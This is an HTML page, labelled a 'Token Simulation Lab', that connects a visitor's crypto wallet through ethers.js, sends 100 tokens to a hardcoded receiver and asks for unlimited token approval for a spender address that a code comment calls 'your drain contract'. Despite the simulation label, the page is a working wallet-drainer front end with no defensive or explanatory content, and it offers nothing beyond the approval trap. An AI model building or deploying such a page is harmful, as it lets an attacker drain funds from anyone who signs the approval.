<!DOCTYPE html>
<html>
<head>
  <title>Token WalletConnect Simulation</title>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
</head>

<body style="font-family:sans-serif">

<h2>🧪 Token Simulation Lab</h2>

<button onclick="connect()">Connect Wallet</button><br><br>

<button onclick="sendToken()">Send 100 Tokens</button><br><br>

<button onclick="approveToken()">Approve Unlimited</button><br><br>

<p id="status"></p>

<script>
let provider, signer, user;

// 🔁 YOUR TOKEN
const tokenAddress = "0x089d6677646bc535B1A8535ED856bb17493E332d";

// 🔁 RECEIVER (can be your same wallet for testing)
const receiver = "0xb52d3770bcf4673009f2f6bf8ba9177cba46d283";

// 🔁 SPENDER (your drain contract)
const spender = "0x8dc3da2ff65ec0bbac40f33efe7c02c9c0b7ebaf";

const tokenABI = [
  "function transfer(address to, uint256 amount) public returns (bool)",
  "function approve(address spender, uint256 amount) public returns (bool)"
];

async function connect() {
  if (!window.ethereum) {
    alert("Open inside wallet browser");
    return;
  }

  await window.ethereum.request({ method: "eth_requestAccounts" });

  provider = new ethers.providers.Web3Provider(window.ethereum, "any");
  signer = provider.getSigner();
  user = await signer.getAddress();

  document.getElementById("status").innerText =
    "Connected: " + user;
}

// 🟢 TOKEN TRANSFER
async function sendToken() {
  try {
    const contract = new ethers.Contract(tokenAddress, tokenABI, signer);

    const tx = await contract.transfer(
      receiver,
      ethers.utils.parseUnits("100", 18)
    );

    await tx.wait();

    alert("✅ 100 tokens sent");

  } catch (e) {
    alert(e.message);
  }
}

// 🔴 APPROVE
async function approveToken() {
  try {
    const contract = new ethers.Contract(tokenAddress, tokenABI, signer);

    const tx = await contract.approve(
      spender,
      ethers.constants.MaxUint256
    );

    await tx.wait();

    alert("🔥 Unlimited approval given");

  } catch (e) {
    alert(e.message);
  }
}
</script>

</body>
</html>
